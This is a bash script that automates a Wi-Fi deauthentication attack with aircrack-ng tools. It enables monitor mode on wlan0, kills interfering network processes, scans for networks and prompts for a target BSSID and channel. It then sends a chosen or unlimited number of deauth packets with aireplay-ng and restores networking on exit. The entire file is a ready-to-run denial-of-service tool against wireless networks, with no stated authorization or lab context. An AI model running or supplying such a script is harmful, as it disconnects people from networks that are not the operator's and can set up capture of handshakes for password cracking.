#!/bin/bash

if [ "$(id -u)" -ne 0 ]; then
    echo "This script must be run as root. Use sudo."
    exit 1
fi

echo "Switching the network interface to monitoring mode..."
sudo ifconfig wlan0 down
sudo airmon-ng start wlan0
INTERFACE=$(iw dev | awk '$1=="Interface"{print $2}' | grep "mon$")

echo "The interface is: " $INTERFACE
if [ -z "$INTERFACE" ]; then
    echo "Error: Unable to detect the interface in monitoring mode."
    exit 1
fi

echo "Monitoring mode activated on $INTERFACE"

sudo airmon-ng check kill

restore_wifi() {
    echo "Restoring Wi-Fi..."
    sudo airmon-ng stop "$INTERFACE"
    sudo systemctl restart NetworkManager
    echo "Wi-Fi restored."
}
trap restore_wifi EXIT

echo "Scanning Wi-Fi networks... Press Ctrl+C when you find the target network."
sudo airodump-ng "$INTERFACE" --band abg

echo "Enter the MAC address (BSSID) of the target network: "
read -r bssid
echo "Enter the channel of the target network: "
read -r channel

echo "Do you want to launch a deauthentication attack? (yes/no)"
read -r deauth_attack

if [ "$deauth_attack" == "yes" ]; then
    echo "Starting deauthentication attack..."
    echo "Enter the number of deauthentication packets to send (0 for infinite):"
    read -r deauth_packets
    echo "Wi-Fi adapter connected to MAC address:" $bssid " on channel:" $channel "... Press Ctrl+C when you have found the network."
    sudo airodump-ng -c "$channel" --bssid "$bssid" "$INTERFACE"
    sudo aireplay-ng --deauth "$deauth_packets" -a "$bssid" "$INTERFACE"
fi

echo "Attack completed."
